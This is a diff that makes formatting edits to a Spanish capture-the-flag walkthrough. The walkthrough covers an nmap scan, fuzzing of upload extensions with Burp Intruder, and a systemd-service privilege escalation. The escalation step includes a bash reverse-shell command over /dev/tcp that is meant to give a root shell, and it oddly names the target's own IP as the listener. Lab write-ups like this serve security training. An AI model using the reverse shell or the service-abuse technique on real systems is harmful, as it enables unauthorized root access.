@@ -49,7 +49,7 @@ Donde:
 - `-sS`: indica que se use el tipo de escaneo TCP SYN.
 - `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
 - `10.10.229.64`: indica la dirección IP del objetivo a escanear.
-- `-oG allPorts`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo allPorts..
+- `-oG allPorts`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo allPorts.
 
 ```bash
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 16:09 -05
@@ -189,10 +189,9 @@ Al tratar de subir archivos con extensiones `.php`, `.txt`, `.jpg` y `.png`, rec
 
 Para identificar automáticamente una extensión permitida, creamos un pequeño diccionario con varias extensiones comunes para luego realizar fuzzing con el módulo **Intruder** de `Burp Suite`.
 
-<aside>
-ℹ️ Sería conveniente mencionar que, aunque en este caso se utilizamos un diccionario con sólo 5 entradas para acelerar el proceso, este método sería mucho más efectivo si empleamos un diccionario con muchas más entradas.
 
-</aside>
+> Sería conveniente mencionar que, aunque en este caso se utilizamos un diccionario con sólo 5 entradas para acelerar el proceso, este método sería mucho más efectivo si empleamos un diccionario con muchas más entradas.
+{: .prompt-info }
 
 ```bash
 .php4
@@ -317,7 +316,7 @@ En resumen, estos comandos crean un servicio de sistema que se ejecuta una sola 
 
 En este caso, realizamos una modificación en el comando que se ejecuta al iniciar el servicio (`id`) por el siguiente comando: `bash -i >& /dev/tcp/10.10.229.64/9002 0>&1`, con el objetivo de obtener una reverse shell como usuario `root`.
 
-Para continuar con el proceso, primero debemos ponernos en escucha en el puerto especificado (`9002`). Luego, nos movemos al directorio `/tmp` en la máquina víctima y ejecutamos la ****siguiente serie de comandos para lograr nuestro objetivo:
+Para continuar con el proceso, primero debemos ponernos en escucha en el puerto especificado (`9002`). Luego, nos movemos al directorio `/tmp` en la máquina víctima y ejecutamos la siguiente serie de comandos para lograr nuestro objetivo:
 
 ```bash
 TF=$(mktemp).service
